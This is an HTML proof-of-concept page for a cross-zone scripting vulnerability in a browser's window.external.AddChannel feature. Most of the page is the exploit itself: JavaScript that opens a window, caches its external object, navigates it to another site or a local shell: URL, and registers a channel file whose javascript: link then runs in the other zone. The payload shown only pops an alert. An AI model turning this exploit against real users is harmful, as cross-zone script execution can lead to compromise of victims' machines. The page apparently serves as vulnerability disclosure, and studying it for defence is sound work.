   <html>
   <body>
   <b><font size="5">External AddChannel Cross Zone Scripting Vulnerability</font></b>
   <br><br>
   <a href="javascript:govuln()"><font size=4 color=red>GO!</font></a><br><br>
   Pressing 'GO!' will open a new window. When it loads, you will be presented with an option to add a favorite. If you press yes, the javascript will execute.
   <br><br>

   <script>
   function govuln(){
   var w=window.open("javascript:''","_blank"); //open page accessible by current page
   var ext=w.external; //(yet another) function cache :)
   var thispage=location.href;
   var loc=thispage.lastIndexOf("/");
   var thispath=thispage.substring(loc,0);
   w.location.href="http://google.com"; //You can also use a local url like shell:windows\\web\\tip.htm.
   w.focus();
   alert("Wait until the page loads.");
   w.focus();
   ext.AddChannel(thispath+"/badchan.cdf");
   /*-----badchan.cdf-----
   <?XML VERSION="1.0" ENCODING="windows-1252" ?>


   <Channel HREF="javascript:alert(location.href)" LastMod="2004-07-04T15:18">
     <Title>You must press OK to continue.</Title>
     <Abstract XML-Space="Preserve">addchannel vulnerability</Abstract>
   </Channel>


   */
   }
   </script>
   </body>
   </html>
